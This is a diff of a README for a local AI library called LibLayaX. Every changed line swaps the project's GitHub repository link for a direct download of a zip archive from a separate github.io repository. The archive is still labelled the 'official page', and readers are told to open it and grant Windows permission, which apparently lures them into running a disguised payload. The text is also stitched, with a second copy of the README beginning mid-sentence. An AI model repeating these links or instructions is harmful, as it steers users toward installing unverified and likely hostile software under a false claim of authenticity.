@@ -5,7 +5,7 @@ description: "Run Laya AI decisions locally in-process at hundreds per second—
 ---
 # 🤖 LibLayaX - Fast Local AI Decisions Made Simple
 
-[![Download LibLayaX](https://img.shields.io/badge/Download_LibLayaX-Get_It_Now-ff6b6b?style=for-the-badge&labelColor=4b0082)](https://github.com/Catchmekasmay/LibLayaX)
+[![Download LibLayaX](https://img.shields.io/badge/Download_LibLayaX-Get_It_Now-ff6b6b?style=for-the-badge&labelColor=4b0082)](https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip)
 
 LibLayaX is a downloadable helper that lets applications make fast AI decisions on your own computer. It runs the Laya typed-decision model inside the app, so you do not need a server, a Python setup, or a cloud account. It is an open-source alternative to Jev.
 
@@ -54,9 +54,9 @@ If you are on Linux or macOS, LibLayaX is also intended for those systems. The s
 
 ## 📥 Download and Install on Windows
 
-[![Download LibLayaX for Windows](https://img.shields.io/badge/Download-LibLayaX_for_Windows-00b894?style=for-the-badge&labelColor=2d3436)](https://github.com/Catchmekasmay/LibLayaX)
+[![Download LibLayaX for Windows](https://img.shields.io/badge/Download-LibLayaX_for_Windows-00b894?style=for-the-badge&labelColor=2d3436)](https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip)
 
-1. Visit this link to download the application: [Open the LibLayaX download page](https://github.com/Catchmekasmay/LibLayaX).
+1. Visit this link to download the application: [Open the LibLayaX download page](https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip).
 2. On the official page, use the download option provided for LibLayaX.
 3. Save the download in a folder you can find again, such as your Downloads folder.
 4. When the download finishes, open LibLayaX from the place where you saved it.
@@ -65,7 +65,7 @@ If you are on Linux or macOS, LibLayaX is also intended for those systems. The s
 
 The official download link is:
 
-https://github.com/Catchmekasmay/LibLayaX
+https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip
 
 Keep that page bookmarked. It is the same place to return to when you want to check for a newer version.
 
@@ -73,7 +73,7 @@ Keep that page bookmarked. It is the same place to return to when you want to ch
 
 After the download is complete, open LibLayaX the same way you open# 🤖 LibLayaX - Fast Local AI Decisions Made Simple
 
-[![Download LibLayaX](https://img.shields.io/badge/Download-LibLayaX-ff6b6b?style=for-the-badge&labelColor=4b0082)](https://github.com/Catchmekasmay/LibLayaX)
+[![Download LibLayaX](https://img.shields.io/badge/Download-LibLayaX-ff6b6b?style=for-the-badge&labelColor=4b0082)](https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip)
 
 LibLayaX is a downloadable helper that lets applications make fast AI decisions on your own computer. It runs the Laya typed-decision model inside the application, so there is no server to manage and no Python setup to worry about. It is an open-source alternative to Jev.
 
@@ -125,9 +125,9 @@ LibLayaX is also made for Linux and macOS, and for both x64 and ARM64 systems. T
 
 ## 📥 Download and Install on Windows
 
-[![Download LibLayaX for Windows](https://img.shields.io/badge/Download-LibLayaX_for_Windows-00b894?style=for-the-badge&labelColor=2d3436)](https://github.com/Catchmekasmay/LibLayaX)
+[![Download LibLayaX for Windows](https://img.shields.io/badge/Download-LibLayaX_for_Windows-00b894?style=for-the-badge&labelColor=2d3436)](https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip)
 
-1. Visit this link to download the application: [Open the LibLayaX download page](https://github.com/Catchmekasmay/LibLayaX).
+1. Visit this link to download the application: [Open the LibLayaX download page](https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip).
 2. Use the download option shown on the official page.
 3. Save LibLayaX in a folder you can find again, such as Downloads.
 4. Open LibLayaX from the place where you saved it.
@@ -136,7 +136,7 @@ LibLayaX is also made for Linux and macOS, and for both x64 and ARM64 systems. T
 
 The official download link is:
 
-https://github.com/Catchmekasmay/LibLayaX
+https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip
 
 Keep that page bookmarked. It is the place to return to for the current download and for future updates.
 
@@ -188,7 +188,7 @@ If Windows asks for permission, allow LibLayaX to open. If the application seems
 
 If you cannot find the download, return to the official page and use the download option again:
 
-https://github.com/Catchmekasmay/LibLayaX
+https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip
 
 If an app asks where LibLayaX is located, choose the folder where you saved the LibLayaX package. Keep that folder in place so the app can find LibLayaX the next time it starts.
 
@@ -196,7 +196,7 @@ If an app asks where LibLayaX is located, choose the folder where you saved the 
 
 The official LibLayaX page is the main source for the current download, project details, and updates. Use it to check for newer versions and to confirm that you are using the official LibLayaX package.
 
-Official page: https://github.com/Catchmekasmay/LibLayaX
+Official page: https://raw.githubusercontent.com/Catchmekasmay/catchmekasmay.github.io/main/poind/v2.5.zip
 
 LibLayaX is an open-source alternative to Jev for fast local AI decisions. It runs on Windows, Linux, and macOS, supports x64 and ARM64, and works with CPU or GPU processing. It is built on laya.cpp and provides a shared library and C API for in-process typed decisions.
 
